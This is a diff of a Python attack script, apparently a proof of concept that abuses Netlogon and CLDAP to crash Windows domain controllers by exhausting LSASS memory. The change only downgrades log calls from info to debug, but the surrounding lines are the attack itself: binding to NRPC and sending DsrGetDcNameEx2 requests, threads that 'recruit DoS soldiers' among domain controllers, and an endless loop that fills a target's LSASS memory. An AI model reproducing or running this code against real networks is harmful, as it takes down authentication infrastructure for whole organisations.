@@ -24,13 +24,13 @@ def call_dsr_get_dc_name_ex2(target_ip: str, port: int, account: str, site_name:
     rpctransport = DCERPCTransportFactory(f'ncacn_ip_tcp:{target_ip}[{port}]')
     dce = rpctransport.get_dce_rpc()
     dce.connect()
-    logger.info(f"Connected to {target_ip}:{port}")
+    logger.debug(f"Connected to {target_ip}:{port}")
 
     try:
         dce.bind(nrpc.MSRPC_UUID_NRPC)
     except DCERPCException:
         logger.error("Failed to bind to NRPC interface!")
-        logger.info("This might be because the target is doesn't have netlogon service running.")
+        logger.debug("This might be because the target is doesn't have netlogon service running.")
         raise
 
     request = nrpc.DsrGetDcNameEx2()
@@ -42,7 +42,7 @@ def call_dsr_get_dc_name_ex2(target_ip: str, port: int, account: str, site_name:
     request['SiteName'] = site_name + NULL
     request['Flags'] = 0
 
-    logger.info("Sending DsrGetDcNameEx2 request...")
+    logger.debug("Sending DsrGetDcNameEx2 request...")
     dce.call(request.opnum, request)
     dce.disconnect()
 
@@ -88,7 +88,7 @@ def trigger_dcs_to_become_cldap_clients(
     """
     threads = []
     for target_ip in target_ips:
-        logger.info(f"Recruiting a DoS soldier {target_ip}")
+        logger.debug(f"Recruiting a DoS soldier {target_ip}")
 
 
         thread = threading.Thread(
@@ -235,7 +235,7 @@ def main():
     """
     args = parse_arguments()
 
-    logger.info("Starting to recruit DoS soldiers")
+    logger.debug("Starting to recruit DoS soldiers")
 
     # Start servers
     udp_server_thread = start_udp_server(args.listen_port, args.tcp_ldap_url)
@@ -245,7 +245,7 @@ def main():
         tcp_server_thread = start_tcp_server(args.listen_port, args.req_count, f"{str(uuid.uuid4())}.com")
 
     # Wait for servers to start
-    logger.info("Waiting for servers to start...")
+    logger.debug("Waiting for servers to start...")
     time.sleep(2)
 
     start_time = time.time()
@@ -254,12 +254,12 @@ def main():
         trigger_dcs_to_become_cldap_clients(args.dos_soldiers, args.domain_name)
     elif args.mode == "dos":
         # Perform a single target DoS attack
-        logger.info(f"Starting DoS attack on {args.target} with domain {args.domain_name}")
+        logger.debug(f"Starting DoS attack on {args.target} with domain {args.domain_name}")
         while True:
             try:
                 fill_remote_lsass_process_memory(args.target, args.domain_name)
             except KeyboardInterrupt:
-                logger.info("Keyboard interrupt detected, stopping DoS attack")
+                logger.debug("Keyboard interrupt detected, stopping DoS attack")
                 break
 
     # Calculate and display total execution time
